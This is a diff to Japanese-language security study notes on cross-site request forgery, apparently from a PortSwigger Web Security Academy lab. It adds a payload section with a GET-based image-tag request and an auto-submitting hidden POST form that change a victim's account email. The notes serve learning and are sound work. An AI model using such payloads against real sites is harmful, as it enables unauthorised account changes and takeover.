@@ -57,14 +57,21 @@
 - 設計・運用上の対策：
   - [誤った設計を避けるためのガイドラインや注意点]
 
-## ## 9 Payload
+## 9 Payload
 ```
+▼Getの場合
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
-```
 
+▼Postの場合
+<form method="POST" action="https://0a47002104cc99ee801e039900c40056.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="csrf2@web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
 
 ---
-
 ## 【補足】理解すべき背景
 - なぜこの脆弱性が成立するのか：
   - [仕様上、設計上、実装上、どの要素が原因か]
